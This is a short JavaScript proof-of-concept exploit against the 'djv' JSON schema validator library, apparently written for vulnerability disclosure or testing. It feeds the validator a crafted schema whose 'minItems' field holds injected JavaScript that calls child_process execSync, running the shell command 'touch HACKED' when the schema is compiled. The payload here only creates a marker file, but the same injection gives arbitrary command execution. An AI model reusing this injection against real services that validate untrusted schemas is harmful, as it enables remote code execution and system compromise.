const djv = require('djv');
const env = new djv();
const evilSchema = JSON.parse('{"common":{"type":"array", "minItems":"process.mainModule.require(`child_process`).execSync(`touch HACKED`)"}}')
env.addSchema('test', evilSchema);
env.validate('test#/common', { type: 'custom' });
